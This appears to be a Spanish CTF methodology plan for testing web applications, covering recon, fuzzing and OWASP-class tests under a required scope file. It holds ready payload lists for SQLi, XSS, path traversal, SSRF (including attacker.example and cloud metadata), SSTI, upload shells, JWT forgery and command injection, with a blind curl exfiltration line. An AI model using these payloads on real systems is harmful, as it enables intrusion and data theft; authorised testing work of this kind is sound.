# Plan de análisis 04 — Aplicaciones web

- **Punto de vista:** Atacante con acceso HTTP/HTTPS a la aplicación desde su superficie expuesta (sin credenciales al inicio). La cadena es: recon → fingerprint → descubrimiento de rutas, vhosts y parámetros → pruebas por clase OWASP → explotación controlada → bandera, documentando cada paso.
- **Cuándo aplicarlo:** Cuando el objetivo expone HTTP/HTTPS (habitualmente 80, 443, 8000, 8080, 8443), tiene login, formularios, API REST/GraphQL, cookies o JWT, o responde distinto según el `Host`.

## Preparación

1. **Alcance (obligatorio):** confirmar que el objetivo figura en `ctf/SCOPE.md` confirmado. Al redactar este plan, ese archivo **no existe** en el repositorio (búsqueda de `ctf/SCOPE.md` sin resultados), así que este documento es solo metodología; no se ejecuta nada contra un host sin alcance confirmado.
2. **Directorio de trabajo** separado por objetivo, p. ej. `evidencias/<reto>/` con subcarpetas `recon/`, `req/` (peticiones y respuestas crudas) y `notas.md`.
3. **Variables** (ejemplo en bash/WSL): `export TARGET="https://TARGET_DENTRO_DEL_ALCANCE"`. En PowerShell: `$env:TARGET = "https://..."`.
4. **Wordlists:** SecLists es el repositorio de referencia para rutas, subdominios y parámetros (fuente: [SecLists](https://github.com/danielmiessler/SecLists), uso citado en writeups de ffuf; no verificado en su estructura exacta). Elegir listas pequeñas primero.
5. **Proxy:** Burp Suite escuchando en `127.0.0.1:8080`, con el navegador o `curl -x http://127.0.0.1:8080 -k` apuntando a él. Anotar la cookie de sesión de cada cuenta de prueba (se necesitan al menos dos para IDOR).
6. **Límites:** fijar hilos bajos (`-t 20` a `-t 40`) y pausas en CTF compartidos para no tumbar el reto ni generar ruido que cause falsos positivos.

## Herramientas

| Herramienta | Para qué | Nativo Windows / Kali-WSL |
|---|---|---|
| curl | Peticiones manuales, cabeceras, cookies, reproducir PoCs. Verificado en docs de curl; viene con Windows 10/11 como `curl.exe`. | Windows: nativo (`curl.exe`). Kali: nativo. |
| whatweb | Fingerprint de tecnologías (servidor, CMS, frameworks, versiones). Niveles de agresividad `-a 1` (una petición) a `-a 4`. [Fuente](https://github.com/urbanadventurer/WhatWeb) | Kali: paquete nativo. Windows: requiere Ruby; más práctico en WSL (no verificado). |
| ffuf | Fuzzing de rutas, parámetros, cabecera `Host` (vhosts), POST. Verificado: `FUZZ` en URL, cabeceras o cuerpo; filtros `-mc`, `-fs`, autocalibración `-ac`. Instalación verificada: `winget install ffuf.ffuf`, `scoop install ffuf`, `go install github.com/ffuf/ffuf/v2@latest` (Go 1.20+). [Fuente](https://github.com/ffuf/ffuf) | Windows: nativo (winget/scoop). Kali: paquete nativo. |
| gobuster | Modo `dir` (rutas, extensiones con `-x`) y modo `vhost`. Verificado: `gobuster dir -u URL -w LISTA -x php,html,txt`; `gobuster vhost -u URL --append-domain -w LISTA`. Requiere Go 1.24+ para instalar desde fuente. [Fuente](https://github.com/OJ/gobuster) | Windows: binario de releases o `go install` (no verificado el binario). Kali: nativo. |
| nikto | Escáner de configuraciones débiles, archivos peligrosos y cabeceras. Muy ruidoso. Verificado: `./nikto.pl -h URL`, `-Pause`, `-Tuning`, `-maxtime`. [Fuente](https://github.com/sullo/nikto) | Windows: requiere Perl o Docker. Kali: nativo. |
| Burp Suite (Community/Pro) | Proxy, Repeater, Intruder, extensión JWT Editor. Burp Pro tiene el escáner. Verificado en docs de PortSwigger. [Fuente](https://portswigger.net/web-security/jwt) | Windows: nativo (instalador). Kali: nativo. |
| wfuzz | Fuzzing alternativo con filtros de respuesta (`--hc`, `--hh`, `-z file`). Uso no verificado en esta investigación. | Windows: Python/pip, menos cómodo. Kali: nativo. |
| nuclei | Escaneo por plantillas YAML (CVE, exposiciones, misconfiguraciones). Verificado: binario por SO en releases, `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`. [Fuente](https://docs.projectdiscovery.io/opensource/nuclei/install) | Windows: binario de releases. Kali: `brew`/binario, o binario Linux. |
| sqlmap (complemento) | Automatiza SQLi tras confirmarla manualmente. No verificado en esta investigación. | Windows: Python. Kali: nativo. |
| jwt_tool / hashcat (complemento) | Manipulación y crackeo de JWT. Verificado: `hashcat -m 16500` para JWT HS256. [Fuente](https://portswigger.net/web-security/jwt) | Windows: hashcat nativo. Kali: nativo. |

> **Catálogo Kali:** ver [KALI_CATALOG.md](../docs/tools/KALI_CATALOG.md) → Reconnaissance (Web) · Initial Access.

## Procedimiento paso a paso

Comandos en bash (Kali/WSL). Sustituir `TARGET`, `WORDLIST` y otros marcadores.

**1. Recon pasivo (sin tocar el objetivo de forma intensiva)**

Revisar el contexto del reto: enunciado, nombres de dominio, cabeceras de ejemplo, código público facilitado. Si hay dominio real dentro del alcance, consultar certificados (transparencia) para subdominios:

```bash
curl -s "https://crt.sh/?q=%25.DOMINIO&output=json" | jq -r '.[].name_value' | sort -u
```

Qué hace: lista nombres de certificados emitidos para el dominio; sirve de entrada para vhosts. No aplicable a IPs de laboratorio.

**2. Fingerprint inicial**

```bash
curl -sk -D - -o /dev/null "$TARGET/"
curl -sk "$TARGET/robots.txt" ; curl -sk "$TARGET/sitemap.xml" ; curl -sk "$TARGET/.well-known/security.txt"
whatweb -a 1 "$TARGET"
```

Qué hace: cabeceras (`Server`, `X-Powered-By`, `Set-Cookie`, `Location`), ficheros de pistas y, con WhatWeb nivel 1, una sola petición que identifica tecnología. Subir a `-a 3` solo si hace falta y está autorizado.

**3. Fuzzing de rutas**

Primero calibrar el tamaño de la respuesta "no existe" (404 personalizado):

```bash
curl -sk -o /dev/null -w "%{size_download}\n" "$TARGET/ruta-que-no-existe-$RANDOM"
```

Luego fuzzing de directorios:

```bash
ffuf -w WORDLIST -u "$TARGET/FUZZ" -mc all -fc 404 -ac -t 30 -o recon/dirs.json -of json
```

Qué hace: prueba cada palabra como ruta; `-ac` autocalibra filtros; `-o` guarda resultados.

Extensiones y backups (en el segundo pase, con lista corta):

```bash
ffuf -w WORDLIST -u "$TARGET/FUZZ" -e .php,.bak,.old,.zip,.tar.gz,~ -mc 200,204,301,302,403 -t 30
gobuster dir -u "$TARGET" -w WORDLIST -x php,html,txt,bak -b 404 -t 20
```

Qué hace: busca copias de respaldo (`index.php.bak`), ficheros de configuración y listados. `403` puede esconder rutas accesibles con otra cabecera o verbo.

**4. Vhosts (fuzzing de cabecera Host)**

Calibrar el tamaño de la respuesta por defecto con un host inexistente, y luego filtrar:

```bash
curl -sk -o /dev/null -w "%{size_download}\n" -H "Host: noexiste-$RANDOM.TARGET_DOMINIO" "$TARGET/"
ffuf -w SUBDOMINIOS.txt -u "$TARGET/" -H "Host: FUZZ.TARGET_DOMINIO" -fs TAMAÑO_POR_DEFECTO -t 30
```

Qué hace: cada palabra se prueba como vhost; `-fs` oculta la respuesta por defecto. Verificado el patrón `-H "Host: FUZZ" -fs <tamaño>` en la documentación de ffuf.

Alternativa con Gobuster: `gobuster vhost -u "https://TARGET_DOMINIO" --append-domain -w SUBDOMINIOS.txt`. Anotar cualquier vhost nuevo en `/etc/hosts` (Windows: `C:\Windows\System32\drivers\etc\hosts`, con permisos de administrador) para navegar.

**5. Mapeo de parámetros y cookies**

Parámetros GET y POST ocultos (hay que filtrar la respuesta base):

```bash
ffuf -w params.txt -u "$TARGET/pagina?FUZZ=prueba" -fs TAMAÑO_BASE -t 30
ffuf -w params.txt -u "$TARGET/api" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "FUZZ=prueba" -fs TAMAÑO_BASE
```

Qué hace: descubre parámetros que cambian la respuesta (p. ej. `debug`, `admin`, `file`, `id`). Lista de parámetros: SecLists (no verificado en su ruta exacta).

Cookies y sesión:

```bash
curl -sk -c jar.txt -b jar.txt -i -X POST "$TARGET/login" --data-urlencode "user=USUARIO" --data-urlencode "pass=CLAVE"
curl -sk -b jar.txt "$TARGET/perfil" -i
```

Qué hace: guarda la cookie de sesión y la reutiliza. Decodificar cookies en base64 o JWT (separadas por `.`) con `base64 -d` o revisando el header JWT.

**6. Escaneo de plantillas y configuración**

```bash
nuclei -u "$TARGET" -severity medium,high,critical -tags exposure,misconfig -rl 20 -o recon/nuclei.txt
nikto -h "$TARGET" -maxtime 600 -output recon/nikto.txt
```

Qué hace: nuclei ejecuta plantillas públicas con límite de peticiones por segundo; nikto busca configuraciones y ficheros conocidos. Ambos generan ruido y falsos positivos, por eso se confirma cada hallazgo a mano (paso 8).

**7. Pruebas activas por clase (manual primero, herramienta después)**

Para cada parámetro o entrada, probar en este orden. Usar un valor "canario" único (`zq7x"'<>`) para ver dónde se refleja.

*a) SQLi (verificado: tipos UNION, error, booleano, tiempo, OAST)*

```text
'            (error o cambio de respuesta)
' OR 1=1-- -  frente a  ' OR 1=2-- -   (respuestas distintas)
' AND SLEEP(5)-- -                     (MySQL, tiempo)
'; WAITFOR DELAY '0:0:5'--            (MSSQL, tiempo)
' AND pg_sleep(5)-- -                 (PostgreSQL, tiempo)
```

Los payloads de tiempo son de conocimiento general, no verificados en la fuente de PortSwigger, que solo describe pruebas "con retardo". Confirmación con herramienta: `sqlmap -u "$TARGET/item?id=1" --batch --level 2 --risk 1`.

*b) XSS (reflejado, almacenado, DOM)*

```text
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

Comprobar si el canario aparece sin codificar en el HTML, atributo o `<script>`.

*c) LFI / path traversal (verificado: `../`, codificación, `....//`, doble codificación, prefijo de carpeta, null byte)*

```text
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252fetc%252fpasswd
....//....//etc/passwd
/etc/passwd                          (ruta absoluta)
../../../../etc/passwd%00.png        (si exige extensión; probar en apps antiguas)
```

En Windows: `..\..\..\windows\win.ini`.

*d) SSRF (verificado: loopback, red interna, ciega; listas negras y blancas)*

```text
url=http://127.0.0.1/admin
url=http://localhost:8080/
url=http://2130706433/          (127.0.0.1 en decimal)
url=http://127.1/               (forma abreviada)
url=http://attacker.example/x   (ciega: confirmar con servidor propio o OAST)
```

Metadatos de nube (`http://169.254.169.254/latest/meta-data/`) son conocidos, pero no están en la fuente de PortSwigger y no se han probado. Aplicar solo si el entorno es de nube y está en alcance.

*e) SSTI (verificado)*

```text
{{7*7}}   ${7*7}   <%= 7*7 %>
{{7*'7'}}  → 49 en Twig, 7777777 en Jinja2
```

Si aparece `49`, hay evaluación de plantillas. Para identificar el motor, provocar errores con sintaxis inválida.

*f) IDOR / control de acceso (verificado: manipulación de identificadores y IDs predecibles)*

Con dos cuentas A y B:

```bash
curl -sk -b "sess=COOKIE_A" "$TARGET/api/pedidos/1001" -i
curl -sk -b "sess=COOKIE_B" "$TARGET/api/pedidos/1001" -i
```

Si B obtiene datos de A, hay IDOR. Probar IDs secuenciales, GUID de otros recursos y verbos (`GET`, `PUT`, `DELETE`) sobre el mismo recurso.

*g) Subida de archivos (verificado: extensiones, Content-Type, polyglot, traversal en nombre, .htaccess/web.config)*

```text
shell.php.jpg          shell.pHp          shell.php%00.jpg
Content-Type: image/jpeg  (cambiar la cabecera de la parte multipart)
../../shell.php        (traversal en filename)
.htaccess con AddType application/x-httpd-php .jpg
```

Comprobar dónde se guarda y si se ejecuta al solicitarlo.

*h) Inyección de comandos (verificado: separadores y técnicas ciegas)*

```text
; id        && whoami        | whoami        $(id)      `id`   (Unix)
& whoami    | whoami         (Windows, separadores &, && y |)
; ping -c 5 127.0.0.1        (Unix, retardo ciego)
& ping -n 5 127.0.0.1         (Windows, retardo ciego)
; curl http://OAST/?x=$(id)  (ciega fuera de banda)
```

*i) Deserialización (conocimiento general, no verificado en esta investigación)*

Buscar blobs en base64 y firmas: Java (`rO0`, `aced0005`), PHP (`O:4:"User"...`), .NET (`AAEAAAD`). Para explotar, usar herramientas específicas del lenguaje (p. ej. ysoserial para Java) solo dentro del alcance.

*j) JWT y autenticación (verificado en PortSwigger y HackTricks: none, confusión de algoritmo, secreto débil, jwk/jku/kid)*

Decodificar y listar header y payload:

```bash
echo 'HEADER_B64' | base64 -d ; echo 'PAYLOAD_B64' | base64 -d
```

Pruebas, de más simple a más compleja:

```text
alg: none  (y variantes None, nOnE, NONE; firma vacía con punto final)
Cambiar sub/role/admin en el payload y reenviar sin verificar firma
Confusión RS256 → HS256 usando la clave pública como secreto HMAC
Secreto débil: hashcat -m 16500 jwt.txt WORDLIST
kid con traversal o SQLi; jwk embebido; jku apuntando a servidor propio
```

Para autenticación en general: credenciales por defecto, respuesta distinta entre usuario válido e inválido, falta de límite de intentos, restablecimiento de contraseña predecible, mass assignment en registro/perfil.

**8. Confirmar y documentar**

Por cada hallazgo, guardar la petición y respuesta crudas en `req/` y una línea en `notas.md`: parámetro, payload, diferencia observada (tamaño, código, tiempo, contenido), y si está confirmado o solo sospechado. Repetir la prueba para descartar falsos positivos por latencia o cachés.

## Qué buscar (indicadores de vulnerabilidad)

- **Fingerprint:** versiones antiguas en cabeceras o HTML; `X-Powered-By`; mensajes de error con motor, framework o rutas internas.
- **Rutas:** `.bak`, `.old`, `.git/`, `.env`, `backup.zip`, paneles `/admin`, `/debug`, `/actuator`, `/phpinfo.php`, respuestas 403 frente a 404.
- **Vhosts:** respuestas de tamaño o contenido distinto al de la IP base; entornos de `dev`, `staging`, `admin`.
- **Parámetros:** nombres como `file`, `path`, `url`, `redirect`, `template`, `cmd`, `id`, `user`; valores que parecen rutas, URLs o identificadores numéricos.
- **Cookies y tokens:** cookies base64 o JWT; cookies `role`/`admin` editables; sesiones que no cambian tras logout.
- **Errores:** `SQL syntax`, `ORA-`, `Traceback`, stack traces, excepciones de plantillas.
- **Respuestas:** reflejo del canario sin codificar; `root:x:0:0` o `[fonts]` en la respuesta (LFI/traversal); `49` para `{{7*7}}`; tiempo de respuesta que sigue al retardo inyectado.

## Cómo interpretar y pasar a explotación

1. **Clasificar:** cada indicio se marca como *sospechoso* (una diferencia), *reproducible* (se repite con variación controlada) o *confirmado* (existe un efecto claro y controlado: lectura de fichero, consulta distinta, retardo exacto, ejecución).
2. **Obtener la primitiva:** lo que se necesita del fallo, no el payload final. Ejemplos: lectura de ficheros arbitraria, ejecución de comandos, acceso a `127.0.0.1`, escritura de un fichero ejecutable, suplantación de usuario.
3. **Encadenar:** las cadenas típicas son SSRF → servicio interno sin autenticación; LFI/traversal → lectura de configuración con credenciales → login; subida de archivo + ruta accesible → ejecución; SSTI → ejecución de comandos del motor; JWT con `alg: none` → acceso de administrador → función que lee el fichero de la bandera.
4. **Explotar de forma controlada:** primero una prueba inocua (`id`, `whoami`, lectura de un fichero conocido), luego el objetivo. Usar herramientas especializadas (sqlmap, scripts propios) solo después de confirmar la vulnerabilidad a mano.
5. **Extraer la bandera:** registrar la ruta completa de la petición que la devuelve. Si no aparece en la respuesta, buscar en ficheros, variables de entorno o base de datos, según la primitiva.
6. **Propuesta (pendiente de aprobación):** antes de cualquier explotación que cambie datos, afecte a otros usuarios o tumbe el servicio, pedir confirmación al usuario.

## Errores comunes y trampas

- **Falsos positivos de vhost y directorios:** sin calibrar el tamaño por defecto o con un comodín DNS, todo "existe". Usar `-ac` o `-fs` con el tamaño de un host inexistente.
- **Confundir 403 con 404:** un 403 indica que la ruta existe; un 200 con tamaño idéntico al de la página base suele ser ruido.
- **Codificación doble:** el filtro puede decodificar una vez y la aplicación otra. Probar variantes codificadas antes de descartar un traversal.
- **Sesiones que expiran:** IDOR y pruebas de JWT fallan si la cookie caduca. Renovar y comprobar antes de concluir.
- **Pruebas de tiempo engañosas:** la latencia de red o un servidor lento puede parecer SQLi. Repetir con valores distintos (3 s, 5 s) y comparar.
- **Ruido y bloqueos:** nikto y nuclei disparan alertas y pueden bloquear la IP. Usar tasas bajas y no ejecutar escáneres completos en objetivos compartidos sin aprobación.
- **Burp fuera de alcance:** Burp puede enviar peticiones a hosts fuera del alcance. Definir el scope de Burp antes de navegar.
- **Diferencias Windows/Linux:** rutas (`\` frente a `/`), comandos (`whoami` ambos, `ping -n` frente a `-c`), y la final de línea en listas (CRLF) pueden romper wordlists y payloads.
- **Confiar en la herramienta:** nuclei y nikto no sustituyen la verificación manual; un hallazgo sin petición reproducible no cuenta.
- **Olvidar documentar:** sin el rastro de peticiones no se puede reconstruir la cadena hasta la bandera.

## Fuentes

- PortSwigger, Web Security Academy — JWT: https://portswigger.net/web-security/jwt
- PortSwigger, SQLi: https://portswigger.net/web-security/sql-injection
- PortSwigger, Path traversal: https://portswigger.net/web-security/file-path-traversal
- PortSwigger, SSRF: https://portswigger.net/web-security/ssrf
- PortSwigger, SSTI: https://portswigger.net/web-security/server-side-template-injection
- PortSwigger, File upload: https://portswigger.net/web-security/file-upload
- PortSwigger, OS command injection: https://portswigger.net/web-security/os-command-injection
- PortSwigger, IDOR: https://portswigger.net/web-security/access-control/idor
- PortSwigger, rutas de aprendizaje (índice): https://portswigger.net/web-security/learning-path
- OWASP WSTG (guía de pruebas, IDs WSTG-INFO, CONF, IDNT, ATHN, ATHZ, SESS, INPV, BUSL, CLNT, APIT): https://wstg.owasp.org/latest/
- HackTricks, JWT (none, quick wins): https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens (contenido verificado solo a nivel de resumen de búsqueda)
- ffuf (README, instalación, FUZZ, vhost, filtros): https://github.com/ffuf/ffuf
- gobuster (dir, vhost, instalación): https://github.com/OJ/gobuster
- WhatWeb: https://github.com/urbanadventurer/WhatWeb
- Nikto: https://github.com/sullo/nikto
- nuclei (instalación): https://docs.projectdiscovery.io/opensource/nuclei/install
- nuclei (visión general): https://docs.projectdiscovery.io/tools/nuclei/overview
- SecLists: https://github.com/danielmiessler/SecLists (no verificado en esta investigación)

**No verificado en esta investigación:** comandos concretos de sqlmap, wfuzz, jwt_tool; payloads de tiempo para MySQL/MSSQL/PostgreSQL; metadatos cloud; payloads de deserialización; instalación nativa de WhatWeb, Nikto, gobuster y wfuzz en Windows; banderas exactas de `-Tuning` de nikto; estructura exacta de SecLists.

## Relación con otros planes

- `analisis/02-red-conexiones.md`: reconocimiento de puertos y servicios que determina qué puertos HTTP probar aquí.
- `analisis/05-bases-datos-consultas.md`: profundiza en SQLi una vez confirmada (sqlmap, extracción, esquemas).
- `analisis/07-osint-reconocimiento.md`: subdominios y fuentes pasivas para vhosts (paso 1).
- Planes de pwn, rev, cripto, forense, stego y otros no existen aún en `analisis/`; cuando la web entregue un binario, un fichero cifrado o una imagen, habría que enlazarlos desde aquí.

## Autorización

- Este plan es **metodología genérica**: no investiga ningún objetivo concreto.
- Para cualquier ejecución: el objetivo debe figurar en `ctf/SCOPE.md` confirmado. Hoy ese archivo no existe, por lo que no se ha autorizado ningún objetivo.
- Ejecución real: la realiza Codex dentro del alcance; Claude solo planifica y redacta el prompt.
- **Propuestas pendientes de aprobación:** (1) añadir a `ctf/SCOPE.md` el criterio de dominios, IPs y puertos permitidos; (2) aprobar el uso de sqlmap y nuclei con límites de tasa en objetivos del reto; (3) decidir si el plan de pwn/rev/cripto/forense/stego debe redactarse en la siguiente iteración.
